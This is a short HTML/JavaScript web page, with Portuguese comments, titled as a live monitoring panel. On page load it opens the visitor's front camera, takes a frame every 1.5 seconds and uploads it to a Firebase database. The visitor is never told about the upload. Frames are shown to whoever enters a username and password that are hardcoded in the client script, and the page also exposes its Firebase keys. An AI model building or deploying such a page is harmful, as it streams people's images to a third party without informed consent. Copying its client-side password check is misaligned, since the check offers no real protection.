<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Monitoramento Live</title>
    <style>
        body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; }
        #admin-area { position: absolute; top: 10px; left: 10px; z-index: 100; }
        .login-box { background: rgba(0, 0, 0, 0.9); padding: 12px; border-radius: 8px; display: flex; flex-direction: column; gap: 8px; border: 1px solid #00ff00; }
        input { padding: 8px; border-radius: 4px; border: none; width: 130px; background: #222; color: #fff; }
        button { cursor: pointer; background: #008000; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; }
        video { width: 100vw; height: 100vh; object-fit: cover; position: absolute; top: 0; left: 0; }
        canvas { display: none; }
        .hidden { display: none !important; }
        
        /* Painel de Live */
        #historico-painel { background: #111; padding: 10px; border-radius: 8px; margin-top: 10px; width: 300px; border: 2px solid #00ff00; }
        #live-frame { width: 100%; border-radius: 4px; display: block; background: #000; margin-top: 10px; }
        .status-live { font-size: 12px; color: #00ff00; font-weight: bold; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas-foto"></canvas>

    <div id="admin-area">
        <div id="form-login" class="login-box">
            <input type="text" id="usuario" placeholder="User">
            <input type="password" id="senha" placeholder="Pass">
            <button onclick="verificarAdmin()">ABRIR MONITORAMENTO AO VIVO</button>
        </div>

        <div id="painel-admin" class="hidden">
            <div class="login-box">
                <div style="display:flex; justify-content: space-between; align-items:center;">
                    <span class="status-live">● AO VIVO</span>
                    <button onclick="location.reload()" style="background:#d9534f; padding: 2px 8px;">X</button>
                </div>
                <div id="historico-painel">
                    <span id="timestamp-live" style="font-size: 10px;">Aguardando sinal...</span>
                    <img id="live-frame" src="">
                </div>
            </div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBg4iJlgMKbkukddt9bWLfpRXm27u14Zg0",
            projectId: "cameralog-24090",
            appId: "1:1054247726586:web:2e3c0584e54ada96a0c843"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        const video = document.getElementById('webcam');
        const canvas = document.getElementById('canvas-foto');
        const liveImg = document.getElementById('live-frame');

        async function iniciarApp() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                
                // Inicia o loop de envio: 1 foto a cada 1.5 segundos
                setInterval(capturarEAtualizar, 1500);
            } catch (err) { console.error(err); }
        }

        function capturarEAtualizar() {
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                const context = canvas.getContext('2d');
                canvas.width = 320; // Tamanho menor para ser ultra rápido
                canvas.height = 240;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const fotoBase64 = canvas.toDataURL('image/jpeg', 0.3);
                
                // USAMOS .doc("live").set() para SEMPRE APAGAR A ANTERIOR e colocar a nova
                db.collection("monitoramento").doc("live").set({
                    timestamp: new Date().toLocaleTimeString(),
                    imagem: fotoBase64
                });
            }
        }

        function verificarAdmin() {
            if (document.getElementById('usuario').value === "Gusta" && document.getElementById('senha').value === "Gusta") {
                document.getElementById('form-login').classList.add('hidden');
                document.getElementById('painel-admin').classList.remove('hidden');
                escutarLive();
            }
        }

        function escutarLive() {
            // Escuta especificamente o documento "live" que está sendo sobrescrito
            db.collection("monitoramento").doc("live").onSnapshot((doc) => {
                if (doc.exists) {
                    const dados = doc.data();
                    liveImg.src = dados.imagem;
                    document.getElementById('timestamp-live').innerText = "Última atualização: " + dados.timestamp;
                }
            });
        }

        window.onload = iniciarApp;
    </script>
</body>
</html>
